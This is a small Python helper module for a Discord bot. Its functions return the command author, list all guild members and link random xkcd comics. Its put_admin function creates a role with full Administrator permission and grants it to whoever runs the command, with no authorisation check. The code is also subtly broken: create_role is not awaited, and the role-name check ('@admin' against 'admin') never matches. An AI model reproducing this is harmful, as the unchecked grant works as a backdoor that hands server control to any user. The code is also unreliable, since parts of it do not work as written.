import discord
from discord.ext import commands
import random

def name(ctx):
        return ctx.author

def count(ctx, bot):
        members = []
        for guild in bot.guilds:
                for member in guild.members:
                        members.append(member)
        return members

async def put_admin(ctx, user):
        hasAdminRole = False
        for role in ctx.guild.roles:
                if (role.name == "@admin"):
                        hasAdminRole = True
                        break
        if not hasAdminRole:
                ctx.guild.create_role(name="admin", permissions=discord.Permissions(8))
        
        role = discord.utils.get(ctx.guild.roles, name="admin")       #print(role)
        await ctx.author.add_roles(role)
        return user

def put_commic(ctx):
        rand = random.randint(1,2500)
        url = "https://xkcd.com/" + str(rand)
        return url
        

        